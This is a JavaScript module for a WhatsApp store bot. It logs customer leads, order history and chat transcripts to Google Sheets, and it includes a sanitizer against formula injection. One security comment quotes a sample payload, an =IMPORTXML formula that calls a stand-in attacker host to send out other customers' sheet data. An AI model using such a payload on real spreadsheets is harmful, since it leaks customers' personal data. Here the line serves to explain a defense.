const fs = require('fs');
const path = require('path');
const { google } = require('googleapis');
const config = require('../config');
const logger = require('../utils/logger');

const LEADS_SHEET_NAME = 'Leads';
const PRODUCTS_SHEET_NAME = 'Products';
// Separate, append-only tab — never upserted-per-phone like Leads is. Leads
// holds one row per customer reflecting their CURRENT state (overwritten on
// every message), so it can't answer "what did this person buy over time" —
// this tab is one row per completed order specifically so that question has
// a real answer. Backs getCustomerHistory()/logOrderHistory() below, which
// power the "Customer Memory & Feedback Retargeting" feature in llmAgent.js.
const ORDER_HISTORY_SHEET_NAME = 'Order History';
const LOCAL_PRODUCTS_PATH = path.join(__dirname, '..', '..', 'products.json');

// Column layout, current as of 2026-07-16 (verified live after every
// structural change below — see HISTORY): A Date, B Customer Name, C
// Customer WhatsApp Number, D Alternative Phone (physically adjacent to the
// primary phone column, per explicit request), E Product Name, F Customer
// Need, G Delivery Address (physically directly before Order Status, per
// explicit request), H Order Status, I Notes, J Conversation History
// (bot-owned: indicator value + full history in the cell Note), K Follow-up
// Date (staff-owned manual column, round-tripped unchanged by appendLead).
//
// HISTORY: this tab has been physically restructured three times now — (1)
// the store owner deleted a "human interaction" column directly in the
// Sheet UI, shifting everything after it left by one; the code wasn't
// updated in step, which silently corrupted the Follow-up Date column for a
// window (see git history); (2) 2026-07-16, moved Alternative Phone next to
// the phone column and Delivery Address before Order Status via two
// explicit moveDimension calls; (3) same day, deleted Customer Message
// entirely (its content is still captured per-message in the Conversation
// History note via buildHistoryEntries — only the standalone column was
// redundant). (2) and (3) both happened live with the bot still running on
// stale code for a few minutes before this file caught up, which produced
// one garbled row (repaired manually afterward). If this tab's layout ever
// looks wrong again, verify the LIVE header row first — don't trust this
// comment or any code constant, and stop the beauty-hub-bot PM2 process
// before making further structural changes to the sheet, not after.
const LEADS_HEADERS = [
  'Date',
  'Customer Name',
  'Customer WhatsApp Number',
  'Alternative Phone',
  'Product Name',
  'Customer Need',
  'Delivery Address',
  'Order Status',
  'Notes',
  'Conversation History',
  'Follow-up Date',
];

// 2026-07-18: "Skin Type"/"Hair Type" merged into a single "Skin/Hair Type"
// column (see the one-time Sheet migration this shipped alongside) — only
// affects ensureHeaderRow's backfill-if-shorter behavior for a brand-new
// sheet; it does not rename an already-existing header row (see
// ensureHeaderRow below), so this has no effect on the already-migrated
// production/sandbox sheets.
const PRODUCTS_HEADERS = [
  'ID',
  'Name',
  'Category',
  'Price',
  'Description',
  'Benefits',
  'Skin/Hair Type',
  'In Stock',
];

const ORDER_HISTORY_HEADERS = ['Date', 'Customer Name', 'Phone', 'Product Name', 'Price', 'Order Status'];

const REQUEST_TIMEOUT_MS = 15 * 1000; // never let a stalled network call block the bot
const STARTUP_TIMEOUT_MS = 20 * 1000;
const RETRY_INTERVAL_MS = 2 * 60 * 1000; // retry a failed/timed-out setup automatically
const STALE_THRESHOLD_MS = 30 * 60 * 1000; // warn if nothing succeeded in this long
const STALENESS_CHECK_INTERVAL_MS = 5 * 60 * 1000;

let sheetsClient = null;
let enabled = false;
let retryTimer = null;
let lastSuccessAt = null;
let staleWarningLogged = false;
// Numeric sheetId of the Leads tab (distinct from its name) — required by
// batchUpdate's updateCells requests (used to set cell Notes below), which
// address cells via GridRange{sheetId, rowIndex, columnIndex} rather than the
// "SheetName!A1" strings the values.* endpoints take. Resolved once in
// ensureSheetsStructure() at startup.
let leadsSheetId = null;
// phone -> 1-based row number in the Leads sheet. Built once at startup by
// reading the existing sheet, then kept in sync as rows are written, so
// appendLead can upsert (one row per phone) instead of always inserting.
let phoneRowCache = new Map();
// phone -> array of { date (ISO string), timestamp (ms), productName, price },
// most-recent-first. Built once at startup from the Order History tab, then
// kept in sync in-memory as new orders are logged — a per-message lookup
// (getCustomerHistory) is a Map read, never a Sheets API call.
let customerHistoryCache = new Map();

// Called after any successful Sheets operation (setup, lead append, product
// fetch) so /health and the staleness monitor reflect real connectivity, not
// just whether Sheets was configured.
function recordSuccess() {
  lastSuccessAt = Date.now();
  staleWarningLogged = false;
}

function getLastSuccessAt() {
  return lastSuccessAt;
}

function isStale(thresholdMs = STALE_THRESHOLD_MS) {
  if (!enabled) return false; // intentionally disabled isn't "stale"
  if (!lastSuccessAt) return true;
  return Date.now() - lastSuccessAt > thresholdMs;
}

function checkStaleness() {
  if (!enabled || staleWarningLogged) return;
  if (isStale()) {
    staleWarningLogged = true;
    const minutesSince = lastSuccessAt ? Math.round((Date.now() - lastSuccessAt) / 60000) : null;
    logger.warn(
      `Google Sheets has not synced successfully in ${minutesSince !== null ? `${minutesSince} minutes` : 'a while'} — check network/credentials. The bot continues running normally with the last known data.`
    );
  }
}

function startStalenessMonitor(intervalMs = STALENESS_CHECK_INTERVAL_MS) {
  const timer = setInterval(checkStaleness, intervalMs);
  if (timer.unref) timer.unref();
}

function columnLetter(count) {
  return String.fromCharCode(64 + count); // 9 -> 'I'
}

function withTimeout(promise, ms, label) {
  let timer;
  const timeout = new Promise((_, reject) => {
    timer = setTimeout(() => reject(new Error(`Timed out after ${ms}ms: ${label}`)), ms);
  });
  return Promise.race([promise, timeout]).finally(() => clearTimeout(timer));
}

async function init() {
  if (!config.googleSheetId) {
    logger.warn('GOOGLE_SHEET_ID is not set. Google Sheets logging is disabled. The WhatsApp bot will continue running without it.');
    enabled = false;
    return;
  }

  if (!fs.existsSync(config.credentialsAbsolutePath)) {
    logger.warn(
      `Google credentials file not found at "${config.credentialsAbsolutePath}". Google Sheets logging is disabled. The WhatsApp bot will continue running without it.`
    );
    enabled = false;
    return;
  }

  try {
    const auth = new google.auth.GoogleAuth({
      keyFile: config.credentialsAbsolutePath,
      scopes: ['https://www.googleapis.com/auth/spreadsheets'],
    });
    sheetsClient = google.sheets({ version: 'v4', auth });
    // Set before ensureSheetsStructure() runs (its sub-steps gate on this
    // flag), but success is NOT logged/recorded until that call actually
    // completes without throwing — see the 2026-07-28 audit note on
    // ensureSheetsStructure() for why: this used to fire unconditionally
    // right here, which logged "initialized" even when structure
    // verification failed immediately afterward (confirmed live 2026-07-27:
    // an OK "initialized" log was followed by hours of "Leads sheetId not
    // resolved" warnings with no retry ever scheduled).
    enabled = true;
    await withTimeout(ensureSheetsStructure(), STARTUP_TIMEOUT_MS, 'Google Sheet tab setup');
    recordSuccess();
    stopRetryTimer();
    logger.success('Google Sheets service initialized and verified.');
  } catch (err) {
    logger.error(
      `Google Sheets setup did not complete (network issue or slow response). The WhatsApp bot will continue running; Sheets logging is disabled until connectivity recovers — retrying automatically every ${RETRY_INTERVAL_MS / 1000}s.`,
      err
    );
    enabled = false;
    scheduleRetry();
  }
}

function scheduleRetry() {
  if (retryTimer) return;
  retryTimer = setInterval(() => {
    logger.info('Retrying Google Sheets connection...');
    init();
  }, RETRY_INTERVAL_MS);
  if (retryTimer.unref) retryTimer.unref();
}

function stopRetryTimer() {
  if (retryTimer) {
    clearInterval(retryTimer);
    retryTimer = null;
  }
}

async function ensureSheetsStructure() {
  if (!enabled) return;
  try {
    const meta = await sheetsClient.spreadsheets.get(
      { spreadsheetId: config.googleSheetId },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    const existingTitles = (meta.data.sheets || []).map((s) => s.properties.title);

    const requests = [];
    if (!existingTitles.includes(LEADS_SHEET_NAME)) {
      requests.push({ addSheet: { properties: { title: LEADS_SHEET_NAME } } });
    }
    if (!existingTitles.includes(PRODUCTS_SHEET_NAME)) {
      requests.push({ addSheet: { properties: { title: PRODUCTS_SHEET_NAME } } });
    }
    if (!existingTitles.includes(ORDER_HISTORY_SHEET_NAME)) {
      requests.push({ addSheet: { properties: { title: ORDER_HISTORY_SHEET_NAME } } });
    }

    if (requests.length > 0) {
      await sheetsClient.spreadsheets.batchUpdate(
        { spreadsheetId: config.googleSheetId, requestBody: { requests } },
        { timeout: REQUEST_TIMEOUT_MS }
      );
      logger.info(`Created Google Sheet tab(s): ${requests.map((r) => r.addSheet.properties.title).join(', ')}`);
    }

    // Re-fetch only if a tab was just created (the Leads tab's sheetId
    // wouldn't be in the `meta` snapshot taken before that batchUpdate ran) —
    // otherwise reuse `meta` rather than spending an extra API call on every
    // startup.
    const leadsMetaSource = requests.length > 0
      ? (await sheetsClient.spreadsheets.get({ spreadsheetId: config.googleSheetId }, { timeout: REQUEST_TIMEOUT_MS })).data
      : meta.data;
    const leadsSheetMeta = (leadsMetaSource.sheets || []).find((s) => s.properties.title === LEADS_SHEET_NAME);
    if (leadsSheetMeta) leadsSheetId = leadsSheetMeta.properties.sheetId;

    await ensureHeaderRow(LEADS_SHEET_NAME, LEADS_HEADERS);
    await ensureProductsTabSeeded();
    await ensureHeaderRow(ORDER_HISTORY_SHEET_NAME, ORDER_HISTORY_HEADERS);
    await loadPhoneRowCache();
    await loadCustomerHistoryCache();
  } catch (err) {
    // Rethrow (2026-07-28 fix) instead of swallowing: this catch only ever
    // fires for the critical path above (spreadsheets.get/batchUpdate/leadsSheetId
    // resolution) — ensureHeaderRow/loadPhoneRowCache/loadCustomerHistoryCache
    // each already catch their own errors and degrade gracefully without
    // throwing, so they never reach here. Letting this propagate to init()'s
    // catch is what makes recordSuccess()/stopRetryTimer() only fire on real
    // success, and what makes scheduleRetry() actually run instead of never
    // firing. Previously this was swallowed here, which left the bot
    // reporting itself healthy for hours while leadsSheetId stayed
    // unresolved and nothing ever retried.
    logger.error('Could not verify/create Google Sheet tabs.', err);
    throw err;
  }
}

async function ensureHeaderRow(sheetName, headers) {
  if (!enabled) return;
  try {
    const range = `${sheetName}!A1:${columnLetter(headers.length)}1`;
    const result = await sheetsClient.spreadsheets.values.get(
      { spreadsheetId: config.googleSheetId, range },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    // Re-write (not just create) the header whenever it's shorter than the
    // current headers list, so adding a trailing column (e.g. Conversation
    // History) to an already-initialized sheet gets backfilled automatically
    // on the next restart instead of silently missing its header forever.
    const values = (result.data.values && result.data.values[0]) || [];
    if (values.length < headers.length) {
      await sheetsClient.spreadsheets.values.update(
        {
          spreadsheetId: config.googleSheetId,
          range,
          valueInputOption: 'RAW',
          requestBody: { values: [headers] },
        },
        { timeout: REQUEST_TIMEOUT_MS }
      );
      logger.info(`Header row created/updated for "${sheetName}" tab.`);
    }
  } catch (err) {
    logger.error(`Could not verify/create header row for "${sheetName}" tab.`, err);
  }
}

// phone number lives in column C (index 2) of the Leads sheet; earliest row
// wins for a given phone so pre-existing historical duplicates (rows written
// before this upsert logic existed) consolidate onto their first row rather
// than the cache flip-flopping between them.
async function loadPhoneRowCache() {
  if (!enabled) return;
  try {
    const result = await sheetsClient.spreadsheets.values.get(
      { spreadsheetId: config.googleSheetId, range: `${LEADS_SHEET_NAME}!A2:C` },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    const rows = result.data.values || [];
    const cache = new Map();
    rows.forEach((row, i) => {
      const phone = row[2];
      if (phone && !cache.has(phone)) cache.set(phone, i + 2); // +2: 1-based, past the header row
    });
    phoneRowCache = cache;
    logger.info(`Loaded ${phoneRowCache.size} existing lead row(s) from the Leads sheet for phone-number dedup.`);
  } catch (err) {
    logger.error('Could not load existing Leads rows for phone-number dedup. Leads will still be logged, just as new rows until the next successful load.', err);
  }
}

// Reads the current Order Status (column H) for every Leads row — the one
// read path in this file that goes the OTHER direction: detecting a
// STAFF-made edit in the sheet rather than something the bot itself wrote.
// Powers deliveryFollowup.js's polling for rows manually switched to
// "Delivered". Returns [{ row, phone, orderStatus }, ...].
async function scanLeadsStatuses() {
  if (!enabled) return [];
  try {
    const result = await sheetsClient.spreadsheets.values.get(
      { spreadsheetId: config.googleSheetId, range: `${LEADS_SHEET_NAME}!C2:H` },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    const rows = result.data.values || [];
    return rows
      .map((row, i) => ({ row: i + 2, phone: row[0], orderStatus: row[5] || '' }))
      .filter((r) => r.phone);
  } catch (err) {
    logger.error('Could not scan Leads Order Status column.', err);
    return [];
  }
}

// Targeted single-cell write (Order Status only, column H) via the existing
// phone -> row cache — used when the BOT itself determines a status change
// (e.g. a customer confirming or disputing delivery), as opposed to
// appendLead's full-row upsert. Never touches any other column.
async function updateOrderStatus(phone, newStatus) {
  if (!enabled) {
    logger.warn('Google Sheets is not configured. Skipping Order Status update (WhatsApp bot continues normally).');
    return false;
  }
  const row = phoneRowCache.get(phone);
  if (!row) {
    logger.warn(`No Leads row found for ${phone} — cannot update Order Status to "${newStatus}".`);
    return false;
  }
  try {
    await sheetsClient.spreadsheets.values.update(
      {
        spreadsheetId: config.googleSheetId,
        range: `${LEADS_SHEET_NAME}!H${row}`,
        valueInputOption: 'USER_ENTERED',
        requestBody: { values: [[newStatus]] },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    logger.success(`Order Status updated to "${newStatus}" for ${phone} (row ${row}).`);
    return true;
  } catch (err) {
    logger.error(`Failed to update Order Status for ${phone}.`, err);
    return false;
  }
}

// Live, targeted read (Product Name..Order Status, columns E-H) for a single
// phone's Leads row — powers the "فين طلبي؟" customer-facing status lookup
// (llmAgent.js). Deliberately a fresh API call rather than a cached read:
// Order Status can change from a STAFF edit directly in the Sheet UI (e.g.
// manually marking a row "Delivered" — see deliveryFollowup.js), which never
// flows back into the bot's own in-memory session state, so only a live read
// is guaranteed current. Returns null if there's no row for this phone yet
// (brand-new customer, never logged) or Sheets is unavailable — the caller
// treats both the same way ("no order on file").
async function getCurrentOrderStatus(phone) {
  if (!enabled) return null;
  const row = phoneRowCache.get(phone);
  if (!row) return null;
  try {
    const result = await sheetsClient.spreadsheets.values.get(
      { spreadsheetId: config.googleSheetId, range: `${LEADS_SHEET_NAME}!E${row}:H${row}` },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    const values = (result.data.values && result.data.values[0]) || [];
    return {
      productName: values[0] || '',
      deliveryAddress: values[2] || '',
      orderStatus: values[3] || '',
    };
  } catch (err) {
    logger.error(`Failed to read live order status for ${phone}.`, err);
    return null;
  }
}

// Builds phone -> [{date, timestamp, productName, price}, ...] (most-recent
// first) from every row in Order History. Unlike loadPhoneRowCache, this
// keeps every row per phone (not just one), since the whole point is a full
// purchase history, not a single current-state row.
async function loadCustomerHistoryCache() {
  if (!enabled) return;
  try {
    const result = await sheetsClient.spreadsheets.values.get(
      { spreadsheetId: config.googleSheetId, range: `${ORDER_HISTORY_SHEET_NAME}!A2:F` },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    const rows = result.data.values || [];
    const cache = new Map();
    rows.forEach((row) => {
      const [date, , phone, productName, price] = row;
      if (!phone || !date) return;
      const timestamp = new Date(date).getTime();
      if (Number.isNaN(timestamp)) return;
      const entry = { date, timestamp, productName: productName || '', price: price || '' };
      const existing = cache.get(phone) || [];
      existing.push(entry);
      cache.set(phone, existing);
    });
    cache.forEach((entries) => entries.sort((a, b) => b.timestamp - a.timestamp));
    customerHistoryCache = cache;
    logger.info(`Loaded order history for ${customerHistoryCache.size} customer(s) from the Order History sheet.`);
  } catch (err) {
    logger.error('Could not load Order History for customer-memory lookups. Returning customers will not be recognized until the next successful load.', err);
  }
}

// Appends one row per completed order (never upserted) and updates the
// in-memory cache immediately, so the very next message from this customer
// — even seconds later — already reflects it without another Sheets read.
async function logOrderHistory(entry) {
  if (!enabled) {
    logger.warn('Google Sheets is not configured. Skipping order-history log (WhatsApp bot continues normally).');
    return false;
  }
  const date = entry.date || new Date().toISOString();
  const phone = entry.phone;
  try {
    await sheetsClient.spreadsheets.values.append(
      {
        spreadsheetId: config.googleSheetId,
        range: `${ORDER_HISTORY_SHEET_NAME}!A:F`,
        valueInputOption: 'USER_ENTERED',
        insertDataOption: 'INSERT_ROWS',
        // See sanitizeRowForSheet's doc comment (near extractRowNumber) —
        // entry.customerName here is the same customer-controlled field as
        // appendLead's, so it needs the same formula-injection guard.
        requestBody: {
          values: [sanitizeRowForSheet([date, entry.customerName || '', phone || '', entry.productName || '', entry.price || '', entry.orderStatus || 'Completed'])],
        },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    if (phone) {
      const timestamp = new Date(date).getTime();
      const existing = customerHistoryCache.get(phone) || [];
      existing.unshift({ date, timestamp, productName: entry.productName || '', price: entry.price || '' });
      existing.sort((a, b) => b.timestamp - a.timestamp);
      customerHistoryCache.set(phone, existing);
    }
    logger.success(`Order history logged for ${phone} (product: ${entry.productName || 'unknown'}).`);
    return true;
  } catch (err) {
    logger.error('Failed to log order history. WhatsApp bot continues normally.', err);
    return false;
  }
}

// Pure in-memory lookup — safe to call on every message. Returns [] for a
// brand-new customer or if Sheets is disabled/hasn't loaded yet.
function getCustomerHistory(phone) {
  return customerHistoryCache.get(phone) || [];
}

// Parses a row number out of a values.append `updatedRange` like
// "Leads!A35:J35" (or the single-cell form "Leads!A35").
function extractRowNumber(updatedRange) {
  const match = /![A-Z]+(\d+)/.exec(updatedRange || '');
  return match ? parseInt(match[1], 10) : null;
}

// SECURITY (2026-07-18): rows are written with valueInputOption:'USER_ENTERED'
// (needed so the bot's own Date column and the staff-owned Follow-up Date
// round-trip stay real Sheets date values, not inert text) — but that mode
// also means a cell value starting with =, +, - or @ gets evaluated as a
// formula by Sheets/Excel. Several fields in a logged row are entirely
// customer-controlled (customerName is the WhatsApp display name — trivial
// for anyone to set to anything; deliveryAddress/notes routinely echo raw
// customer-typed text). Without this, a customer could set their WhatsApp
// name to something like =IMPORTXML("https://evil.example/x?"&A1&C1,"//a")
// and have it silently execute the moment a staff member opens the sheet —
// exfiltrating other customers' data or serving a phishing link. Prefixing a
// leading apostrophe is the standard CSV/formula-injection mitigation: it
// forces Sheets to store the value as literal text, exactly like typing '=
// directly into a cell in the Sheets UI does.
const FORMULA_TRIGGER_CHARS = new Set(['=', '+', '-', '@']);

function sanitizeForSheetCell(value) {
  if (typeof value !== 'string' || value.length === 0) return value;
  return FORMULA_TRIGGER_CHARS.has(value[0]) ? `'${value}` : value;
}

function sanitizeRowForSheet(row) {
  return row.map(sanitizeForSheetCell);
}

// 2026-07-18: the Conversation History note now holds a clean JSON array of
// {role, content} chat turns — the exact OpenAI fine-tuning message shape —
// instead of a human-readable "[timestamp] العميل: ..." text block, so the
// 2-month dataset this is building up can be exported and used for local-LLM
// fine-tuning with no manual cleanup. buildHistoryEntries turns one turn of
// a logged message into 0-2 of those {role, content} objects.
function buildHistoryEntries(entry) {
  const turns = [];
  if (entry.customerMessage) turns.push({ role: 'user', content: entry.customerMessage });
  if (entry.replyText) turns.push({ role: 'assistant', content: entry.replyText });
  return turns;
}

// Rows written before 2026-07-18 have a note in the old free-text format
// ("[timestamp] العميل: ..." / "[timestamp] سارة: ..." lines) rather than
// JSON. Parsed once, on first read, into the same {role, content} shape so
// existing customers' history carries forward into the new column format
// instead of being silently dropped the next time they message.
function parseLegacyHistoryText(text) {
  return text
    .split('\n')
    .map((line) => {
      const match = /^\[.*?\]\s(العميل|سارة):\s(.*)$/.exec(line);
      if (!match) return null;
      return { role: match[1] === 'العميل' ? 'user' : 'assistant', content: match[2] };
    })
    .filter(Boolean);
}

// Existing note (previousHistory from getExistingRowState) is either JSON
// from this format, JSON from an even older run, or legacy free text — this
// normalizes all three into a plain {role, content}[] to append new turns to.
function parseExistingHistoryEntries(noteText) {
  if (!noteText) return [];
  try {
    const parsed = JSON.parse(noteText);
    return Array.isArray(parsed) ? parsed : [];
  } catch (err) {
    return parseLegacyHistoryText(noteText);
  }
}

// Conversation History (column J, 0-indexed 9 — see the LEADS_HEADERS
// note above) used to hold the full, ever-growing chat transcript as the
// cell's VALUE — fine for a few turns, but it made rows balloon to dozens of
// lines tall over a long-running conversation and turned the sheet into a
// wall of text. Now the cell just shows a short indicator and the full
// transcript lives in the cell's Note (hover to read), keeping every row a
// single compact line while losing nothing — same data, same phone-based
// upsert/accumulation logic, just moved off the visible grid.
const CONVERSATION_HISTORY_COLUMN_INDEX = 9; // J
const HISTORY_INDICATOR_TEXT = '📄 View History';
// Google Sheets caps a cell Note at roughly 50,000 characters; stay well
// under that so a long-running conversation's note write never gets
// rejected outright — trim whole turns from the oldest end (never mid-object,
// which would produce invalid JSON) and keep the most recent (most
// operationally relevant, and most useful for training) messages.
const MAX_NOTE_LENGTH = 45000;

// String-based variant kept only for scripts/migrateHistoryToNotes.js, a
// one-time (already-applied, idempotent) migration of raw cell VALUES into
// Notes — predates the JSON-array format and operates on plain transcript
// strings, not {role, content} entries.
function truncateHistoryForNote(history) {
  if (history.length <= MAX_NOTE_LENGTH) return history;
  const marker = '...[سجل أقدم اتقطع للحفاظ على حجم الملاحظة]...\n';
  return marker + history.slice(history.length - (MAX_NOTE_LENGTH - marker.length));
}

function serializeHistoryEntries(entries) {
  let trimmed = entries;
  let serialized = JSON.stringify(trimmed);
  while (serialized.length > MAX_NOTE_LENGTH && trimmed.length > 1) {
    trimmed = trimmed.slice(1);
    serialized = JSON.stringify(trimmed);
  }
  if (trimmed.length < entries.length) {
    logger.warn(`Conversation History note exceeded ${MAX_NOTE_LENGTH} chars — dropped ${entries.length - trimmed.length} oldest turn(s).`);
  }
  return serialized;
}

// Sets (or replaces) the Note on the Conversation History cell for a given
// 1-based row number. `historyText` must already be final (e.g. the JSON
// string from serializeHistoryEntries, already truncated at the turn level)
// — this no longer truncates itself, since naively cutting mid-string would
// produce invalid JSON. Uses updateCells with fields:'note' specifically so
// it only ever touches the Note — never the cell's displayed value, which is
// written separately via the normal values.update/append calls in
// appendLead() below.
async function setConversationHistoryNote(rowNumber, historyText) {
  if (leadsSheetId === null) {
    logger.warn('Leads sheetId not resolved yet — skipping conversation-history note write this time (will retry on next message).');
    return;
  }
  await sheetsClient.spreadsheets.batchUpdate(
    {
      spreadsheetId: config.googleSheetId,
      requestBody: {
        requests: [
          {
            updateCells: {
              range: {
                sheetId: leadsSheetId,
                startRowIndex: rowNumber - 1,
                endRowIndex: rowNumber,
                startColumnIndex: CONVERSATION_HISTORY_COLUMN_INDEX,
                endColumnIndex: CONVERSATION_HISTORY_COLUMN_INDEX + 1,
              },
              rows: [{ values: [{ note: historyText }] }],
              fields: 'note',
            },
          },
        ],
      },
    },
    { timeout: REQUEST_TIMEOUT_MS }
  );
}

// Reads J's existing Note (previous conversation history, NOT its value —
// the value is just the indicator text) and K's current value (Follow-up
// Date, staff-owned, must round-trip unchanged) for a given 1-based row.
// spreadsheets.get (not values.get) is required here since values.get never
// returns Notes.
async function getExistingRowState(rowNumber) {
  const result = await sheetsClient.spreadsheets.get(
    {
      spreadsheetId: config.googleSheetId,
      ranges: [`${LEADS_SHEET_NAME}!J${rowNumber}:K${rowNumber}`],
      fields: 'sheets.data.rowData.values(formattedValue,note)',
    },
    { timeout: REQUEST_TIMEOUT_MS }
  );
  const cells = ((((result.data.sheets || [])[0] || {}).data || [])[0] || {}).rowData?.[0]?.values || [];
  return {
    previousHistory: (cells[0] && cells[0].note) || '',
    followUpDate: (cells[1] && cells[1].formattedValue) || '',
  };
}

function productToRow(product) {
  return [
    product.id || '',
    product.name || '',
    product.category || '',
    product.price || '',
    product.description || '',
    Array.isArray(product.benefits) ? product.benefits.join(', ') : '',
    Array.isArray(product.targetType) ? product.targetType.join(', ') : '',
    product.inStock === false ? 'FALSE' : 'TRUE',
  ];
}

async function ensureProductsTabSeeded() {
  try {
    await ensureHeaderRow(PRODUCTS_SHEET_NAME, PRODUCTS_HEADERS);

    const result = await sheetsClient.spreadsheets.values.get(
      { spreadsheetId: config.googleSheetId, range: `${PRODUCTS_SHEET_NAME}!A2:A2` },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    const hasData = result.data.values && result.data.values.length > 0;
    if (hasData) return;

    if (!fs.existsSync(LOCAL_PRODUCTS_PATH)) return;
    const localProducts = JSON.parse(fs.readFileSync(LOCAL_PRODUCTS_PATH, 'utf-8'));
    if (!Array.isArray(localProducts) || localProducts.length === 0) return;

    const rows = localProducts.map(productToRow);
    await sheetsClient.spreadsheets.values.append(
      {
        spreadsheetId: config.googleSheetId,
        range: `${PRODUCTS_SHEET_NAME}!A:H`,
        valueInputOption: 'RAW',
        insertDataOption: 'INSERT_ROWS',
        requestBody: { values: rows },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    logger.success(`Seeded "Products" tab with ${rows.length} starter products from products.json.`);
  } catch (err) {
    logger.error('Could not seed "Products" tab with starter data.', err);
  }
}

// One row per phone number: updates the existing row (accumulating the full
// conversation into the Conversation History column) if this phone has
// written before, otherwise appends a new row and remembers it for next time.
async function appendLead(entry) {
  if (!enabled) {
    logger.warn('Google Sheets is not configured. Skipping lead log (WhatsApp bot continues normally).');
    return false;
  }

  const phone = entry.customerPhone;
  const newTurns = buildHistoryEntries(entry);

  // A..I — matches LEADS_HEADERS order exactly (Alternative Phone sits right
  // after the phone column, Delivery Address right before Order Status, per
  // the store owner's explicit layout request; Customer Message has no
  // column of its own anymore — still captured per-message in the
  // Conversation History note via buildHistoryEntries above).
  // sanitizeRowForSheet guards every field here in one place rather than
  // trusting a per-field judgment about which ones are "customer-controlled
  // today" — cheap, and immune to a future change elsewhere quietly making a
  // currently-safe field (e.g. productName) attacker-influenced.
  const row = sanitizeRowForSheet([
    new Date().toISOString(),
    entry.customerName || '',
    phone || '',
    entry.altPhone || '',
    entry.productName || '',
    entry.customerNeed || '',
    entry.deliveryAddress || '',
    entry.orderStatus || '',
    entry.notes || '',
  ]);

  const existingRow = phoneRowCache.get(phone);

  try {
    if (existingRow) {
      // Read K (Follow-up Date — staff-owned, must round-trip unchanged) and
      // J's existing Note (previous conversation history) so the update
      // below can't blank out K, and so the new line accumulates onto the
      // full history rather than replacing it.
      const { previousHistory, followUpDate } = await getExistingRowState(existingRow);
      const combinedTurns = [...parseExistingHistoryEntries(previousHistory), ...newTurns];

      await sheetsClient.spreadsheets.values.update(
        {
          spreadsheetId: config.googleSheetId,
          range: `${LEADS_SHEET_NAME}!A${existingRow}:K${existingRow}`,
          valueInputOption: 'USER_ENTERED',
          requestBody: { values: [[...row, HISTORY_INDICATOR_TEXT, followUpDate]] },
        },
        { timeout: REQUEST_TIMEOUT_MS }
      );
      await setConversationHistoryNote(existingRow, serializeHistoryEntries(combinedTurns));
      logger.success(`Google Sheet row updated for ${phone} (status: ${entry.orderStatus}).`);
    } else {
      const appendResult = await sheetsClient.spreadsheets.values.append(
        {
          spreadsheetId: config.googleSheetId,
          range: `${LEADS_SHEET_NAME}!A:K`,
          valueInputOption: 'USER_ENTERED',
          insertDataOption: 'INSERT_ROWS',
          requestBody: { values: [[...row, HISTORY_INDICATOR_TEXT, '']] },
        },
        { timeout: REQUEST_TIMEOUT_MS }
      );
      const newRowNumber = extractRowNumber(appendResult.data.updates && appendResult.data.updates.updatedRange);
      if (newRowNumber) {
        phoneRowCache.set(phone, newRowNumber);
        await setConversationHistoryNote(newRowNumber, serializeHistoryEntries(newTurns));
      }
      logger.success(`Google Sheet log saved for ${phone} (status: ${entry.orderStatus}).`);
    }
    recordSuccess();
    return true;
  } catch (err) {
    logger.error('Failed to write row to Google Sheet. WhatsApp bot continues normally.', err);
    return false;
  }
}

function isEnabled() {
  return enabled;
}

function getClient() {
  return enabled ? sheetsClient : null;
}

module.exports = {
  init,
  appendLead,
  logOrderHistory,
  getCustomerHistory,
  scanLeadsStatuses,
  updateOrderStatus,
  getCurrentOrderStatus,
  isEnabled,
  getClient,
  recordSuccess,
  getLastSuccessAt,
  isStale,
  startStalenessMonitor,
  PRODUCTS_SHEET_NAME,
  LEADS_SHEET_NAME,
  ORDER_HISTORY_SHEET_NAME,
  REQUEST_TIMEOUT_MS,
  CONVERSATION_HISTORY_COLUMN_INDEX,
  HISTORY_INDICATOR_TEXT,
  truncateHistoryForNote,
  buildHistoryEntries,
  parseExistingHistoryEntries,
  serializeHistoryEntries,
  sanitizeForSheetCell,
  sanitizeRowForSheet,
};
